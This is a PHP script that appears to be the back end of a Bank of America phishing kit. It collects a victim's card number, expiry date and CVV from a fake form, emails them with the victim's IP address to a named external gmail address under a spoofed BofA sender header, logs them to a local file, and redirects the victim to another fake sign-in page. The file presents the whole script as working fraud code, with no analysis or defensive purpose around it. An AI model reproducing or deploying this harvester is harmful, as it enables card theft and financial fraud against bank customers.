<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------Bofa Job-----------\n";
$message .= "Card Number : ".$_POST['Cnumber']."\n";
$message .= "Month : ".$_POST['b1']."\n";
$message .= "Year : ".$_POST['b3']."\n";
$message .= "CVV : ".$_POST['cWW']."\n";
$message .= "-----------NextLevel-------------\n";

$send = "100fareedah@gmail.com";
$subject = "My Fresh BofA - $ip";
$headers = "From: BofA<support@mymoney.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("virus.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: index5.html?signinpage&update=/&cookiecheck=yes&destination=nba/signin&accountopening/ApplicationStartup/Application$update=&cookiecheck/yes&destinpage&update");

	 
?>